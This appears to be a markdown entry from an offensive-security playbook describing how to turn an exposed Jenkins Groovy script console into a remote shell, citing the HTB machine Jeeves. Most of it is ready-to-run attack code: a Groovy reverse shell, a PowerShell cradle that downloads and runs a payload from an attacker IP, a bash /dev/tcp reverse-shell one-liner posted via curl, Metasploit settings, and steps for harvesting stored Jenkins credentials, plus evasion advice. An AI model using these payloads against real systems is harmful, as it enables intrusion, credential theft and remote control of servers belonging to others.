# Jenkins Groovy Console RCE

> An unauthenticated `/script` endpoint on a Jenkins instance is RCE
> by design — the Groovy console executes arbitrary code as the
> Jenkins service account.

## Objective
Convert an exposed Jenkins instance with permissive auth (or
"Anyone can do anything" grants) into an immediate shell.

## When To Use
- A web port (commonly 8080, 8081, 50000) banners as "Jenkins".
- The default landing page renders without prompting for login, *or*
  shows a "View as anonymous" link.
- `/script` is reachable without authentication.

## Detection Indicators
- HTTP `X-Jenkins:` header.
- Page title contains "Jenkins".
- `<a href="/script">Script Console</a>` visible.
- Sometimes `Manage Jenkins → Configure Global Security` was set to
  "anyone can do anything" — reachable via `/securityRealm`.

## Enumeration Strategy

```bash
# fingerprint
curl -sI http://<ip>:<port>/ | grep -i jenkins
curl -s http://<ip>:<port>/ | grep -i jenkins

# check auth status
curl -s -o /dev/null -w "%{http_code}\n" http://<ip>:<port>/script
# 200 → unauthenticated access; 403 → auth required

# version disclosure
curl -sI http://<ip>:<port>/ | grep -i 'X-Jenkins:'

# find script console paths
gobuster dir -u http://<ip>:<port>/ -w common-jenkins-paths.txt
```

## Exploitation Workflow

### Path A — Groovy script console (the standard path)

Browser → `http://<ip>:<port>/script` → Groovy textarea.

```groovy
// minimal verification
println "hostname".execute().text

// real reverse shell (Linux Jenkins worker)
String host="10.10.14.x"; int port=4444; String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0) so.write(pi.read());
  while(pe.available()>0) so.write(pe.read());
  while(si.available()>0) po.write(si.read());
  so.flush(); po.flush(); Thread.sleep(50);
  try {p.exitValue(); break;} catch (Exception e){}
};
p.destroy(); s.close();
```

### Path A (Windows Jenkins worker — Jeeves)

```groovy
def cmd = "powershell.exe -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 4444"
def proc = ["cmd.exe","/c",cmd].execute()
proc.waitFor()
println proc.text
```

### Path B — `/manage` / `/credentials` if creds are needed

If `/script` requires auth but you can register / find creds:
- `/credentials/store/system/domain/_/` lists stored credentials —
  Jenkins may have reusable secrets.

### Path C — Metasploit

```
use exploit/multi/http/jenkins_script_console
set RHOSTS <ip>
set RPORT <port>
set TARGETURI /
set PAYLOAD windows/x64/meterpreter/reverse_tcp     # or linux/x64/...
set LHOST tun0
set LPORT 4444
run
```

## Commands

```bash
# script content via curl (auth-less)
curl -s -X POST "http://<ip>:<port>/script" \
  --data-urlencode "script=println 'whoami'.execute().text"

# with Jenkins crumb (if CSRF protection on)
crumb=$(curl -s "http://<ip>:<port>/crumbIssuer/api/json" | jq -r '.crumb')
curl -s -X POST "http://<ip>:<port>/script" \
  -H "Jenkins-Crumb: $crumb" \
  --data-urlencode "script=println 'id'.execute().text"
```

## Tool Usage

- **Browser** — for the textarea.
- **`curl`** — for scripted invocation.
- **Metasploit `jenkins_script_console`** — automated.
- **`Nishang Invoke-PowerShellTcp.ps1`** — companion payload for
  Windows workers.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Hitting `/manage` instead of `/script` | "Page not found" | The script console URL is literally `/script` |
| Crumb-protected POST | 403 Forbidden | Pull `/crumbIssuer/api/json`, include header |
| Wrong shell language for worker | Shell never appears | Linux worker → bash; Windows worker → PowerShell |
| Forgetting `-nop -ep bypass` | PowerShell exec policy blocks | Add both flags |
| Trying `Runtime.getRuntime().exec` and not capturing output | "I think it ran but nothing happened" | Use the `.execute().text` form for sync output |

## Decision-Making Logic

```
port banners as Jenkins
  └─ /script returns 200 (anon) → Groovy RCE → reverse shell
  └─ /script returns 403 → look for default creds (admin:admin)
                          → /credentials store after auth
                          → CVE-2018-1000861 (older Jenkins; pre-auth RCE)
```

## Pivot Opportunities

After RCE on Jenkins:
- Jenkins service account often has `SeImpersonate` (Windows) →
  Potato.
- Jenkins persistent secrets in `~/.jenkins/credentials.xml` — often
  AES-encrypted but the master key is on disk.
- Build job configs may reference DB/SSH credentials — check
  `~/.jenkins/jobs/*/config.xml`.

## OPSEC Considerations
- The Groovy script runs with the privileges of the Jenkins service
  user. Activity is logged to `jenkins.log`.
- `/script` requests appear in access logs.
- Avoid pasting the entire payload in plain — use a download-and-IEX
  cradle.

## Real HTB Examples

- **Jeeves** — Jenkins on `:50000`, `/script` accessible anonymously,
  PowerShell reverse shell to attacker.

## Alternative Techniques

- **CVE-2018-1000861** — pre-auth RCE on older Jenkins via Stapler
  reflection.
- **Jenkins build job manipulation** — when no console but you have
  `Job/Build` perms.
- **CLI client RCE (CVE-2017-1000353)** — older Jenkins CLI Java
  deserialisation.

## Automation Opportunities

```bash
# one-shot reverse shell (Linux worker)
LHOST=10.10.14.x; LPORT=4444
PAYLOAD='Process p = new ProcessBuilder(["bash","-c","bash -i >& /dev/tcp/'$LHOST'/'$LPORT' 0>&1"]).redirectErrorStream(true).start(); p.waitFor()'
curl -s -X POST "http://<ip>:<port>/script" --data-urlencode "script=$PAYLOAD"
```

## Checklist

- [ ] `/script` reachable without auth (or default creds work)
- [ ] Listener on `4444` (or chosen port)
- [ ] Payload language matches worker OS
- [ ] Reverse shell received, then stabilised

## Related Skills

- [`web/jenkins-credential-mining.md`](jenkins-credential-mining.md)
- [`reverse-shells/powershell-reverse-shell.md`](../reverse-shells/powershell-reverse-shell.md)
- [`windows-privesc/token-impersonation.md`](../windows-privesc/token-impersonation.md)
- [`tool-usage/metasploit.md`](../tool-usage/metasploit.md)
- [`methodology/04-web-attack-flow.md`](../methodology/04-web-attack-flow.md)
